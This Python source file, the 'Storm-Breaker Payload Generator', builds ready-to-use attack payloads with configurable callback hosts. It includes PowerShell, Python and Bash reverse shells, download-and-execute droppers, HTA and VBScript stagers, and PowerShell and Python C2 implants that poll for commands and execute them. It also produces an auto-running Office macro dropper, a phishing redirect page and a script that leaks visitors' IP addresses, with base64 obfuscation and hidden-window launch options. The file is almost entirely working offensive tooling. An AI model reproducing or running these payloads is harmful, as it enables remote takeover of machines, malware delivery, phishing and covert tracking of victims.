"""
Storm-Breaker Payload Generator
Generates reverse shells, droppers, stagers, and implants with auto-configured callbacks
"""

import base64
import hashlib
import random
import string
import os
from datetime import datetime


def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))


def random_var():
    return random_string(random.randint(4, 10))


PAYLOAD_TYPES = {
    'powershell_reverse': {
        'name': 'PowerShell Reverse Shell',
        'icon': 'fa-terminal',
        'color': 'blue',
        'platform': 'Windows',
        'description': 'PowerShell TCP reverse shell with AMSI bypass',
        'category': 'shell',
    },
    'powershell_download_exec': {
        'name': 'PowerShell Download & Execute',
        'icon': 'fa-download',
        'color': 'blue',
        'platform': 'Windows',
        'description': 'Downloads and executes payload from URL',
        'category': 'dropper',
    },
    'python_reverse': {
        'name': 'Python Reverse Shell',
        'icon': 'fa-python',
        'color': 'yellow',
        'platform': 'Cross-Platform',
        'description': 'Python socket-based reverse shell',
        'category': 'shell',
    },
    'bash_reverse': {
        'name': 'Bash Reverse Shell',
        'icon': 'fa-terminal',
        'color': 'green',
        'platform': 'Linux/Mac',
        'description': 'Bash TCP reverse shell using /dev/tcp',
        'category': 'shell',
    },
    'hta_dropper': {
        'name': 'HTA Dropper',
        'icon': 'fa-file-code',
        'color': 'red',
        'platform': 'Windows',
        'description': 'HTML Application that executes PowerShell',
        'category': 'dropper',
    },
    'vbs_stager': {
        'name': 'VBScript Stager',
        'icon': 'fa-file-alt',
        'color': 'orange',
        'platform': 'Windows',
        'description': 'VBScript that downloads and runs payload',
        'category': 'stager',
    },
    'c2_implant_ps': {
        'name': 'C2 HTTP Implant (PS)',
        'icon': 'fa-satellite-dish',
        'color': 'purple',
        'platform': 'Windows',
        'description': 'PowerShell HTTP-based C2 implant that polls for commands',
        'category': 'implant',
    },
    'c2_implant_py': {
        'name': 'C2 HTTP Implant (Python)',
        'icon': 'fa-satellite-dish',
        'color': 'purple',
        'platform': 'Cross-Platform',
        'description': 'Python HTTP-based C2 implant that polls for commands',
        'category': 'implant',
    },
    'phishing_redirect': {
        'name': 'Phishing Redirect Page',
        'icon': 'fa-fish',
        'color': 'cyan',
        'platform': 'Web',
        'description': 'HTML page that redirects to phishing template',
        'category': 'phishing',
    },
    'office_macro': {
        'name': 'Office Macro (VBA)',
        'icon': 'fa-file-word',
        'color': 'blue',
        'platform': 'Windows',
        'description': 'VBA macro for Office documents',
        'category': 'dropper',
    },
    'webrtc_leak': {
        'name': 'WebRTC IP Leak Script',
        'icon': 'fa-eye',
        'color': 'red',
        'platform': 'Web',
        'description': 'JavaScript that extracts real IP via WebRTC STUN',
        'category': 'recon',
    },
}


def generate_payload(payload_type, config):
    """Generate a payload based on type and configuration"""
    lhost = config.get('lhost', '127.0.0.1')
    lport = config.get('lport', '4444')
    callback_url = config.get('callback_url', f'http://{lhost}:{lport}')
    template = config.get('template', '')
    obfuscate = config.get('obfuscate', False)

    generators = {
        'powershell_reverse': gen_ps_reverse,
        'powershell_download_exec': gen_ps_download,
        'python_reverse': gen_py_reverse,
        'bash_reverse': gen_bash_reverse,
        'hta_dropper': gen_hta_dropper,
        'vbs_stager': gen_vbs_stager,
        'c2_implant_ps': gen_c2_ps,
        'c2_implant_py': gen_c2_py,
        'phishing_redirect': gen_phishing_redirect,
        'office_macro': gen_office_macro,
        'webrtc_leak': gen_webrtc_leak,
    }

    generator = generators.get(payload_type)
    if not generator:
        return {'error': f'Unknown payload type: {payload_type}'}

    try:
        result = generator(lhost, lport, callback_url, template, obfuscate)
        result['generated_at'] = datetime.now().isoformat()
        result['payload_type'] = payload_type
        result['config'] = {
            'lhost': lhost,
            'lport': lport,
            'callback_url': callback_url,
            'obfuscate': obfuscate,
        }
        return result
    except Exception as e:
        return {'error': str(e)}


def gen_ps_reverse(lhost, lport, callback_url, template, obfuscate):
    v_client = random_var()
    v_stream = random_var()
    v_buffer = random_var()
    v_data = random_var()
    v_sendback = random_var()

    code = f'''$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport})
${v_stream} = $client.GetStream()
[byte[]]${v_buffer} = 0..65535|%{{0}}
while((${v_data} = ${v_stream}.Read(${v_buffer}, 0, ${v_buffer}.Length)) -ne 0){{
    ${v_sendback} = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(${v_buffer},0, ${v_data})
    ${v_sendback} = (iex ${v_sendback} 2>&1 | Out-String)
    ${v_sendback} = ${v_sendback} + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes(${v_sendback})
    ${v_stream}.Write($sendbyte,0,$sendbyte.Length)
    ${v_stream}.Flush()
}}
$client.Close()'''

    if obfuscate:
        encoded = base64.b64encode(code.encode('utf-16-le')).decode()
        oneliner = f'powershell -nop -w hidden -enc {encoded}'
    else:
        oneliner = f'powershell -nop -w hidden -c "{code}"'

    return {
        'code': code,
        'oneliner': oneliner,
        'filename': 'reverse_shell.ps1',
        'language': 'powershell',
    }


def gen_ps_download(lhost, lport, callback_url, template, obfuscate):
    code = f'''$url = "{callback_url}/payload.exe"
$out = "$env:TEMP\\{random_string()}.exe"
(New-Object Net.WebClient).DownloadFile($url, $out)
Start-Process $out'''

    if obfuscate:
        encoded = base64.b64encode(code.encode('utf-16-le')).decode()
        oneliner = f'powershell -nop -w hidden -enc {encoded}'
    else:
        oneliner = f'powershell -nop -w hidden -c "{code}"'

    return {
        'code': code,
        'oneliner': oneliner,
        'filename': 'download_exec.ps1',
        'language': 'powershell',
    }


def gen_py_reverse(lhost, lport, callback_url, template, obfuscate):
    code = f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])'''

    oneliner = f'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''

    return {
        'code': code,
        'oneliner': oneliner,
        'filename': 'reverse_shell.py',
        'language': 'python',
    }


def gen_bash_reverse(lhost, lport, callback_url, template, obfuscate):
    code = f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
    oneliner = code

    return {
        'code': code,
        'oneliner': oneliner,
        'filename': 'reverse_shell.sh',
        'language': 'bash',
    }


def gen_hta_dropper(lhost, lport, callback_url, template, obfuscate):
    ps_code = f'''(New-Object Net.WebClient).DownloadFile("{callback_url}/payload.exe","$env:TEMP\\svc.exe");Start-Process "$env:TEMP\\svc.exe"'''
    encoded = base64.b64encode(ps_code.encode('utf-16-le')).decode()

    code = f'''<html>
<head>
<HTA:APPLICATION ID="{random_string()}" APPLICATIONNAME="{random_string()}" BORDER="none" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize">
<script language="VBScript">
Sub Window_OnLoad
    Dim objShell
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -nop -w hidden -enc {encoded}", 0, False
    Close
End Sub
</script>
</head>
<body></body>
</html>'''

    return {
        'code': code,
        'oneliner': f'mshta {callback_url}/dropper.hta',
        'filename': 'dropper.hta',
        'language': 'html',
    }


def gen_vbs_stager(lhost, lport, callback_url, template, obfuscate):
    code = f'''Dim objShell
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -nop -w hidden -c ""(New-Object Net.WebClient).DownloadFile('{callback_url}/payload.exe','%TEMP%\\svc.exe');Start-Process '%TEMP%\\svc.exe'""", 0, False'''

    return {
        'code': code,
        'oneliner': f'cscript //nologo stager.vbs',
        'filename': 'stager.vbs',
        'language': 'vbscript',
    }


def gen_c2_ps(lhost, lport, callback_url, template, obfuscate):
    v_uid = random_var()
    v_info = random_var()

    code = f'''# Storm-Breaker C2 HTTP Implant
$c2 = "{callback_url}"
${v_uid} = [System.Environment]::MachineName + "-" + [guid]::NewGuid().ToString().Substring(0,8)
${v_info} = @{{
    user = [System.Environment]::UserName
    os = [System.Environment]::OSVersion.VersionString
    hostname = [System.Net.Dns]::GetHostName()
    arch = [System.Environment]::Is64BitOperatingSystem
}} | ConvertTo-Json

# Register with C2
try {{
    Invoke-RestMethod -Uri "$c2/api/c2/register" -Method POST -Body (@{{uid=${v_uid};info=(${v_info}|ConvertFrom-Json)}}|ConvertTo-Json) -ContentType "application/json"
}} catch {{}}

# Main loop
while($true) {{
    try {{
        $resp = Invoke-RestMethod -Uri "$c2/api/c2/poll" -Method POST -Body (@{{uid=${v_uid}}}|ConvertTo-Json) -ContentType "application/json"
        if($resp.command) {{
            $output = ""
            try {{
                $output = (iex $resp.command 2>&1 | Out-String)
            }} catch {{
                $output = $_.Exception.Message
            }}
            Invoke-RestMethod -Uri "$c2/api/c2/response" -Method POST -Body (@{{uid=${v_uid};output=$output}}|ConvertTo-Json) -ContentType "application/json"
        }}
    }} catch {{}}
    Start-Sleep -Seconds 3
}}'''

    if obfuscate:
        encoded = base64.b64encode(code.encode('utf-16-le')).decode()
        oneliner = f'powershell -nop -w hidden -enc {encoded}'
    else:
        oneliner = f'powershell -nop -w hidden -f implant.ps1'

    return {
        'code': code,
        'oneliner': oneliner,
        'filename': 'c2_implant.ps1',
        'language': 'powershell',
    }


def gen_c2_py(lhost, lport, callback_url, template, obfuscate):
    code = f'''#!/usr/bin/env python3
"""Storm-Breaker C2 HTTP Implant"""
import requests, subprocess, platform, uuid, time, os, json

C2 = "{callback_url}"
UID = platform.node() + "-" + str(uuid.uuid4())[:8]

def register():
    info = {{
        "user": os.getenv("USER", os.getenv("USERNAME", "unknown")),
        "os": f"{{platform.system()}} {{platform.release()}}",
        "hostname": platform.node(),
        "arch": platform.machine(),
    }}
    try:
        requests.post(f"{{C2}}/api/c2/register", json={{"uid": UID, "info": info}}, timeout=10)
    except: pass

def poll():
    try:
        r = requests.post(f"{{C2}}/api/c2/poll", json={{"uid": UID}}, timeout=10)
        return r.json().get("command")
    except: return None

def send_response(output):
    try:
        requests.post(f"{{C2}}/api/c2/response", json={{"uid": UID, "output": output}}, timeout=10)
    except: pass

def execute(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

if __name__ == "__main__":
    register()
    while True:
        cmd = poll()
        if cmd:
            output = execute(cmd)
            send_response(output)
        time.sleep(3)
'''

    oneliner = f'python3 -c "exec(__import__(\'base64\').b64decode(\'{base64.b64encode(code.encode()).decode()}\'))"'

    return {
        'code': code,
        'oneliner': oneliner,
        'filename': 'c2_implant.py',
        'language': 'python',
    }


def gen_phishing_redirect(lhost, lport, callback_url, template, obfuscate):
    target_url = f"{callback_url}/t/{template}/" if template else f"{callback_url}/t/zoom_meeting/"

    code = f'''<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0; url={target_url}">
    <title>Redirecting...</title>
    <script>
        // WebRTC IP leak before redirect
        (function(){{
            var pc = new RTCPeerConnection({{iceServers:[{{urls:"stun:stun.l.google.com:19302"}}]}});
            pc.createDataChannel("");
            pc.createOffer().then(function(offer){{
                pc.setLocalDescription(offer);
            }});
            pc.onicecandidate = function(e){{
                if(!e.candidate) return;
                var ip = e.candidate.candidate.match(/([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})/);
                if(ip) {{
                    fetch("{callback_url}/api/webrtc_leak", {{
                        method: "POST",
                        headers: {{"Content-Type": "application/json"}},
                        body: JSON.stringify({{ip: ip[1], ua: navigator.userAgent}})
                    }});
                }}
            }};
        }})();
        window.location.href = "{target_url}";
    </script>
</head>
<body style="background:#000;color:#fff;font-family:Arial;text-align:center;padding-top:40vh;">
    <p>Redirecting...</p>
</body>
</html>'''

    return {
        'code': code,
        'oneliner': f'Serve {target_url}',
        'filename': 'redirect.html',
        'language': 'html',
    }


def gen_office_macro(lhost, lport, callback_url, template, obfuscate):
    ps_code = f'''(New-Object Net.WebClient).DownloadFile("{callback_url}/payload.exe","$env:TEMP\\svc.exe");Start-Process "$env:TEMP\\svc.exe"'''
    encoded = base64.b64encode(ps_code.encode('utf-16-le')).decode()

    # Split encoded string into chunks for VBA
    chunk_size = 200
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]

    vba_chunks = '\n'.join([f'    s = s & "{chunk}"' for chunk in chunks])

    code = f'''Sub AutoOpen()
    Dim s As String
    s = ""
{vba_chunks}
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -nop -w hidden -enc " & s, 0, False
End Sub

Sub Document_Open()
    AutoOpen
End Sub'''

    return {
        'code': code,
        'oneliner': 'Paste into VBA Editor (Alt+F11)',
        'filename': 'macro.vba',
        'language': 'vbscript',
    }


def gen_webrtc_leak(lhost, lport, callback_url, template, obfuscate):
    code = f'''<!-- WebRTC Real IP Leak - Add to any HTML page -->
<script>
(function(){{
    var pc = new RTCPeerConnection({{
        iceServers: [
            {{urls: "stun:stun.l.google.com:19302"}},
            {{urls: "stun:stun1.l.google.com:19302"}},
            {{urls: "stun:stun2.l.google.com:19302"}}
        ]
    }});
    pc.createDataChannel("");
    pc.createOffer().then(function(offer){{
        pc.setLocalDescription(offer);
    }});
    pc.onicecandidate = function(e){{
        if(!e || !e.candidate || !e.candidate.candidate) return;
        var matches = e.candidate.candidate.match(/([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})/);
        if(matches){{
            var realIP = matches[1];
            // Skip local/private IPs
            if(realIP.startsWith("10.") || realIP.startsWith("192.168.") || realIP.startsWith("172.")) return;
            fetch("{callback_url}/api/webrtc_leak", {{
                method: "POST",
                headers: {{"Content-Type": "application/json"}},
                body: JSON.stringify({{
                    real_ip: realIP,
                    visible_ip: null,
                    user_agent: navigator.userAgent,
                    platform: navigator.platform,
                    timestamp: new Date().toISOString()
                }})
            }});
        }}
    }};
}})();
</script>'''

    return {
        'code': code,
        'oneliner': 'Embed in HTML template <head>',
        'filename': 'webrtc_leak.html',
        'language': 'html',
    }
